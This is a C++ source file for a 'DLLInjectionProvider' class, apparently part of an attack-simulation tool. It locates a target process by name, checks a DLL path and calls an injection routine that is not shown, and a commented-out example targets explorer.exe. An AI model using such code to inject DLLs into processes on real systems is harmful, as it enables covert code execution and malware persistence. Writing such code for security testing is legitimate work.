#include <iostream>
#include <Shlwapi.h>
#include "DLLInjectionProvider.h"

bool DLLInjectionProvider::SetTargetProcessByName(const string _name) {
    wstring name(_name.begin(), _name.end());
    hProcess = GetProcessHandleByName(name);
    if (hProcess == NULL) {
        results += "SetTargetProcessByName() failed. Could not get HANDLE to target process. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    return TRUE;
}

bool DLLInjectionProvider::SetTargetDLL(const string _dllPath) {
    wstring dllPath(_dllPath.begin(), _dllPath.end());
    if (!PathFileExistsW(dllPath.c_str())) {
        results += "SetTargetDLL() failed. File not found. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    this->dllPath = dllPath;
    return TRUE;
}

bool DLLInjectionProvider::ExecuteAttack() {
    if (dllPath == L"" || hProcess == NULL) {
        return FALSE;
    }
    if (LoadDll(hProcess, dllPath.c_str())) {
        results += "The DLL Injection attack was successful\n";
        return TRUE;
    } else {
        results += "The DLL Injection attack failed. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
}



// int main() {

//     DLLInjectionProvider a;
//     a.SetTargetProcessByName(L"explorer.exe");
//     a.SetTargetDLL(L"InjectedDLL.dll");
//     a.ExecuteAttack();

//     cout << a.GetAttackResults() << endl;

// }